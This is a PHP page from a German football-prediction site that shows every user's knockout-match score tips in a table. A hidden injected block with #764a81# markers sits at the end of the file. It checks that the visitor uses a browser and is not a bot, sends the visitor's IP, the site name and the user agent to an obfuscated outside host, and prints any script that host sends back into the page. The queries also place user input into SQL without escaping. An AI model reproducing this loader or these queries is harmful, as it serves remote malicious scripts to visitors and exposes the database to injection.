<?php
session_start();
$userId=$_GET["userId"];
if(strlen($userId)==0)
{
	header("Location: ../util/login.php5");
	exit;
}
echo "<html>";
echo "<head>";
echo "<title>EM-Tipp - Tipps ALL USERS (Germany)</title>";
echo "</head>";
echo "<body>";
include_once("../../connection/dbaccess.php5");
include_once("../../general/log/log.php5");
include_once("../util/calc.php5");
include_once("../util/dbutil.php5");
include_once("../util/dbschema.php5");

$log=new viewlogger();
$log->info("clicked showAllUsersFinalmatchTipps.php5");


printFinalMatches();


function getUserInfo($username){
	$tableusers=dbschema::users;
	$sql="SELECT * from $tableusers WHERE username='$username'";
	$resultUser=mysql_query($sql);
	$array=mysql_fetch_array($resultUser);
	$firstname=$array["firstname"];
	$lastname=$array["lastname"];
	return "$firstname $lastname";
}

function printFinalMatches(){
	
	echo "<h3>Finalspiele</h3>";
	$table_matches=dbschema::matches;
	$sql="SELECT * FROM $table_matches m WHERE m.matchtype!='Gruppenspiel'";
	$sqlResult=mysql_query($sql);
	
	echo "<table border='1' rules='all'>";
	echo "<tr>";
	echo "<th>Spiel</th> ";
	while($array=mysql_fetch_array($sqlResult)){
		
		$matchnr = $array["matchnr"];
		echo "<th align='center'> $matchnr </th>";
	}
	echo "</tr>";
	
	$table_users=dbschema::users;
	$sql="SELECT * FROM $table_users t ORDER BY lastname,firstname";
	$sqlResult=mysql_query($sql);
	while($array=mysql_fetch_array($sqlResult)){
		
		echo "<tr>";
		printFinalMatchesForUser($array["username"]);
		echo "</tr>";
	}
	echo "</table>";
}
function printFinalMatchesForUser($username){
	
	$table_matches=dbschema::matches;
	$table_users=dbschema::users;
	$table_tipps=dbschema::finalmatchtipps;
	echo "<tr>";
	echo "<td>" . getUserInfo($username) . "</td>";
	$sql="SELECT * FROM $table_matches m, $table_tipps t WHERE m.matchnr=t.matchnr AND t.user='$username' AND m.matchtype!='Gruppenspiel' ORDER BY m.matchnr ASC";
	$sqlResult=mysql_query($sql);
	while($array=mysql_fetch_array($sqlResult)){
		
		$matchnr=$array["matchnr"];
		$teamName1=$array["teamX"];
		$teamName2=$array["teamY"];
		$tippGoalsTeam1=getGoals1($username, $matchnr); if (strlen($tippGoalsTeam1)==0) $tippGoalsTeam1='&nbsp; ';
		$tippGoalsTeam2=getGoals2($username, $matchnr); if (strlen($tippGoalsTeam2)==0) $tippGoalsTeam2='&nbsp; ';
		echo "<td align='center'>$teamName1-$teamName2 / $tippGoalsTeam1 : $tippGoalsTeam2</td>";
	}
	echo "</tr>";
}


function getGoals1($username, $matchnr){
	$table_finalmatchtipps=dbschema::finalmatchtipps;
	$result=mysql_query("SELECT goalsX FROM $table_finalmatchtipps WHERE user = '$username' AND matchnr = $matchnr;");
	$array=mysql_fetch_array($result);
	$goals=$array["goalsX"];
	return $goals;
}
function getGoals2($username, $matchnr){
	$table_finalmatchtipps=dbschema::finalmatchtipps;
	$result=mysql_query("SELECT goalsY FROM $table_finalmatchtipps WHERE user = '$username' AND matchnr = $matchnr;");
	$array=mysql_fetch_array($result);
	$goals=$array["goalsY"];
	return $goals;
}

?>
<?php
#764a81#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/764a81#
?>
